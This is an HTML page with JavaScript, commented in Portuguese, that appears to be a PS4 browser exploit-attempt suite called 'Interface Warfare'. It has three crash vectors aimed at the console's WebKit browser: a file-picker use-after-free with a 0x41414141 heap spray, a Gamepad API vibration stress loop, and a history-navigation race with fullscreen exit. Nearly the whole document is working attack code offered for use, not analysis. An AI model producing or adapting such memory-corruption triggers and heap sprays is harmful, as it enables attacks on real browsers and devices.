<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v450000: Interface Warfare</title>
<style>
    body { background: #000; color: #fa0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #fa0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #320; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #210; color: #fff; border: 2px solid #fa0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #fa0; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
    
    /* Input escondido para o teste de upload */
    #uploader { position: absolute; top: -1000px; }
</style>
</head>
<body>

<h1>v450000: INTERFACE WARFARE</h1>

<div class="status" id="msg">
    NOVAS COMBINAÇÕES DE INTERFACE<br>
    CLIQUE -> FULLSCREEN -> SIGA INSTRUÇÃO
</div>

<button onclick="warfare(w01)">01. Upload Picker + Fullscreen Nuke</button>

<button onclick="warfare(w02)">02. Rumble Crash (Gamepad API)</button>

<button onclick="warfare(w03)">03. History Navigation Race</button>

<input type="file" id="uploader">
<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    const Msg = document.getElementById('msg');
    const Uploader = document.getElementById('uploader');
    
    // Armazém global
    let temp_store = [];

    function warfare(vectorFunc) {
        Stage.innerHTML = "";
        temp_store = [];
        
        // 1. Configura
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Execução
        requestAnimationFrame(() => {
            setTimeout(() => {
                if(target._start) target._start();
            }, 100);
        });
    }

    // =================================================================
    // 01. Upload Picker + Fullscreen Nuke
    // Tenta abrir a janela de seleção de arquivos do sistema (Overlay)
    // ao mesmo tempo que destruímos o elemento que pediu o arquivo.
    // =================================================================
    function w01(stage) {
        const d = document.createElement('div');
        d.innerText = "UPLOAD TRAP";
        stage.appendChild(d);

        d._start = () => {
            Msg.innerText = "⚠️ PREPARANDO UPLOAD... ⚠️";
            
            // O truque: Simular um clique no input file
            // E destruir o input IMEDIATAMENTE antes do sistema responder
            setTimeout(() => {
                Msg.innerText = ">>> ABRA O SELETOR DE ARQUIVOS! <<<";
                // Nota: Navegadores modernos exigem clique do usuário.
                // Se o PS4 bloquear o .click() automático, você terá que clicar manualmente no input visível.
                Uploader.click(); 
                
                // Destruição síncrona imediata
                // O sistema operacional tenta abrir o picker para um elemento morto
                Uploader.remove(); 
                d.remove();
                
                // Spray para ocupar o lugar do input na memória
                for(let i=0; i<5000; i++) temp_store.push(new Uint32Array(1024).fill(0x41414141));
                
                // SE O SELETOR ABRIR: Tente fechar ou selecionar algo.
                // O crash deve ocorrer na transição de volta ao browser.
            }, 500);
        };
        return d;
    }

    // =================================================================
    // 02. Rumble Crash (Gamepad API)
    // Envia comandos de vibração para o controle e corta a conexão (via JS)
    // durante o Fullscreen. Isso estressa o driver USB/Bluetooth.
    // =================================================================
    function w02(stage) {
        const d = document.createElement('div');
        d.innerText = "GAMEPAD ATTACK";
        stage.appendChild(d);

        d._start = () => {
            Msg.innerText = "⚠️ SEGURE O CONTROLE! ⚠️";
            
            function loop() {
                const gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
                if(gamepads[0]) {
                    const gp = gamepads[0];
                    // Tenta vibrar (se suportado pelo API do PS4 WebKit)
                    if (gp.vibrationActuator) {
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            startDelay: 0, duration: 1000, weakMagnitude: 1.0, strongMagnitude: 1.0
                        });
                    }
                    
                    // O GOLPE: Criar e destruir objetos Gamepad na memória
                    // Forçando o navegador a re-ler o estado do hardware
                    temp_store.push(gp);
                    if(temp_store.length > 100) temp_store = [];
                    
                    // Flash na tela para estresse visual
                    document.body.style.background = (Math.random()>0.5)?'#000':'#100';
                }
                requestAnimationFrame(loop);
            }
            loop();
            
            // Depois de 3 segundos de vibração, matamos o renderer
            setTimeout(() => {
                Msg.innerText = ">>> APERTE ATUALIZAR AGORA! <<<";
                d.remove();
                // A ideia é que o driver de input tente reportar status para uma aba morta
            }, 3000);
        };
        return d;
    }

    // =================================================================
    // 03. History Navigation Race
    // Usa history.back() e history.forward() em alta velocidade
    // enquanto entra e sai de Fullscreen.
    // =================================================================
    function w03(stage) {
        const d = document.createElement('div');
        d.innerText = "HISTORY RACE";
        stage.appendChild(d);

        // Enche o histórico
        for(let i=0; i<10; i++) history.pushState({id:i, junk: "A".repeat(1024*100)}, "", "#"+i);

        d._start = () => {
            Msg.innerText = "⚠️ NAVEGANDO FURIOSAMENTE... ⚠️";
            
            let count = 0;
            const interval = setInterval(() => {
                count++;
                
                // Navega para trás e para frente
                if(count % 2 === 0) history.back();
                else history.forward();
                
                // Tenta interagir com o estado enquanto navega
                try {
                    const state = history.state;
                    // Modifica o estado durante a transição (Race Condition)
                    history.replaceState(null, "", "#crash");
                } catch(e){}
                
                // NO 10º CICLO: NUKE
                if(count === 10) {
                    clearInterval(interval);
                    d.remove();
                    document.body.innerHTML = "DEAD";
                    Msg.innerText = ">>> TENTE SAIR DO FULLSCREEN <<<";
                    // Tenta forçar a saída do fullscreen programaticamente num estado inválido
                    if(document.exitFullscreen) document.exitFullscreen();
                }
            }, 50); // Velocidade alta
        };
        return d;
    }

</script>
</body>
</html>
